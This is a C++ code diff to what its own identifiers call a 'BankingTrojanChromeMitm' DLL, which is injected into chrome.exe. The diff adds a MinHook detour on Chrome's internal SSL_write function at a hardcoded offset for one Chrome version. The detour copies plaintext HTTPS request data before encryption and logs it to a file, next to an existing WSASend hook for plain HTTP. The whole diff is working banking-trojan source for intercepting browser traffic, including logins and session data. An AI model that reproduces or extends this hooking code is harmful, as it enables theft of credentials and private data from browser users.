@@ -150,6 +150,10 @@ void logBankingTrojanChromeMitmHttp(const std::wstring& message) {
 	Logger::getInstance().log(L"BankingTrojanChromeMitmHttp.txt", message);
 }
 
+void logBankingTrojanChromeMitmHttp11OverTls(const std::wstring& message) {
+	Logger::getInstance().setLogFile(L"BankingTrojanChromeMitmHttp1.1OverTls.txt");
+	Logger::getInstance().log(L"BankingTrojanChromeMitmHttp1.1OverTls.txt", message);
+}
 /*
 	Common functions
 */
@@ -720,7 +724,9 @@ DWORD WINAPI ExplorerMainThread(LPVOID lpParam)
 	Whem dll file injection to chrome.exe, it will run this function.
 */
 
+// For HTTP
 // Hook WSASend
+
 /*
 int WSAAPI WSASend(
   [in]  SOCKET                             s,
@@ -789,12 +795,13 @@ bool chromeHookWSASend() {
 		return 1;
 	}
 
+	/*
 	// Initialize MinHook
 	if (MH_Initialize() != MH_OK) {
 		if (DEBUG)
 			MessageBoxW(NULL, L"Fail to MH_Initialize", L"chromeHookWSASend", MB_OK);
 		return 1;
-	}
+	}*/
 
 	// Create a hook for WSASend
 	int status = MH_CreateHook(ZwWSASend, &DetourWSASend, reinterpret_cast<LPVOID*>(&fpWSASend));
@@ -815,9 +822,88 @@ bool chromeHookWSASend() {
 	return 1;
 }
 
-int chromeMain() {
 
+// For HTTPS 1.1 
+typedef int(__fastcall* SSL_write_t)(void* ssl, const void* buf, int num);
+SSL_write_t Original_SSL_write = nullptr;
+
+int __fastcall DetourSSL_write(void* ssl, const void* buf, int num) {
+
+	if (buf != nullptr && num > 0) {
+		const char* data = static_cast<const char*>(buf);
+		std::string buffer(data, num);
+		// write to log
+		logBankingTrojanChromeMitmHttp11OverTls(std::wstring(buffer.begin(), buffer.end()).c_str());
+	}
+
+	return Original_SSL_write(ssl, buf, num);
+}
+
+
+bool chromeHookSSL_write()
+{
+	HMODULE hDLL = GetModuleHandleW(L"chrome.dll");
+
+	DWORD_PTR sslWriteOffset = 0x7B4D00; // 129.0.6668.71
+	DWORD_PTR doPayloadWrite = 0x7B4A50; 
+
+	BYTE* sslWriteAddress = reinterpret_cast<BYTE*>(hDLL) +sslWriteOffset;
+
+
+	if (!hDLL) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Fail to LoadLibrary", L"chromeHookDoPayloadWrite", MB_OK);
+		return 0;
+	}else
+	{
+		/*
+		if (DEBUG) {
+			// show address
+			std::wstring message = L"chrome.dll address: ";
+			message += std::to_wstring((DWORD)hDLL);
+			MessageBoxA(NULL, std::string(message.begin(), message.end()).c_str(), "chromeHookDoPayloadWrite", MB_OK);
+		
+		}*/
+	}
+
+	/*
+	// Initialize MinHook
+	if (MH_Initialize() != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Failed to initialize MinHook.", L"chromeHookDoPayloadWrite", MB_OK);
+		return 1;
+	}*/
+
+	if (MH_CreateHook(
+		reinterpret_cast<LPVOID>(sslWriteAddress), // 要鉤取的函數地址
+		&DetourSSL_write,                          // 鉤子函數地址
+		reinterpret_cast<LPVOID*>(&Original_SSL_write) // 原始函數指針
+	) != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Failed to create hook for SSL_write.", L"chromeHookDoPayloadWrite", MB_OK);
+		return false;
+	}
+
+	// 啟用鉤子
+	if (MH_EnableHook(reinterpret_cast<LPVOID>(sslWriteAddress)) != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Failed to enable hook for SSL_write.", L"chromeHookDoPayloadWrite", MB_OK);
+		return false;
+	}
+
+	return 1;
+}
+
+
+
+int chromeMain() {
+	if (MH_Initialize() != MH_OK) {
+		if (DEBUG)
+			MessageBoxW(NULL, L"Failed to initialize MinHook.", L"chromeMain", MB_OK);
+		return 1;
+	}
 	chromeHookWSASend();
+	chromeHookSSL_write();
 
 	return 1;
 }
